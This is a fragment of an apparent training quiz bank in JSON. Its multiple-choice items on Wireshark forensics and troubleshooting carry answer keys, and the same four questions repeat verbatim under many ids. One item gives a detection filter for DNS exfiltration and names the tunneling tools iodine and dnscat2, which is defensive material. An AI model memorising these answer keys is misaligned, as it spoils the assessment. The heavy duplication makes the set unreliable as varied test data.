  },
  {
    "id": "q_c2_m8_047",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_048",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_049",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_050",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_051",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_052",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_053",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_054",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_055",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_056",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_057",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_058",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_059",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_060",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_061",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_062",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_063",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_064",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_065",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_066",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_067",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_068",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_069",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_070",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_071",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_072",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_073",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_074",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_075",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_076",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_077",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_078",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_079",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_080",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_081",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_082",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_083",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_084",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_085",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_086",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_087",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_088",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_089",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_090",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_091",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_092",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_093",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_094",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
